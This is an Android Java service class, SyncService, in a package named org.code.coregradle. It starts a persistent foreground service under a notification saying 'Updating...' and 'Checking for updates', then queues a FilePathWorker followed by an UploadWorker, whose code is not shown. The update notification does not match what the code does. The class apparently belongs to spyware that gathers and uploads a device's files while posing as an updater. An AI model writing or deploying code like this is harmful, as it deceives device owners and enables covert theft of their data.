package org.code.coregradle.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;
import androidx.work.WorkManager;

import org.code.coregradle.R;
import org.code.coregradle.workers.FilePathWorker;
import org.code.coregradle.workers.UploadWorker;

public class SyncService extends Service {
    private static String channelId = "SyncChannel";
    private NotificationManager notificationManager;

    public SyncService() {

    }


    @Override
    public void onCreate() {
        super.onCreate();
        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
    }

    public static void createNotificationChannel(Context context) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = notificationManager.getNotificationChannel(channelId);
            if (notificationChannel == null) {
                notificationChannel = new NotificationChannel(channelId, "Synchronization Channel", NotificationManager.IMPORTANCE_HIGH);
                notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
    }

    public NotificationChannel createChannelIfNotExists(String channelId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = notificationManager.getNotificationChannel(channelId);
            if (notificationChannel == null) {
                notificationChannel = new NotificationChannel(channelId, "Synchronization Channel", NotificationManager.IMPORTANCE_HIGH);
                notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            return notificationChannel;
        }
        return null;
    }


    private Notification createNotification() {
        createChannelIfNotExists(channelId);
        return new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.drawable.ic_launcher_round)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                .setColor(0xff11acfa)
                .setOngoing(false)
                .setContentTitle("Updating...")
                .setContentText("Checking for updates")
                .build();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = createNotification();
        startForeground(21, notification);
        WorkManager.getInstance(this)
                .beginWith(FilePathWorker.getOneTimeWorkRequest())
                .then(UploadWorker.getOneTimeWorkRequest(7))
                .enqueue();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}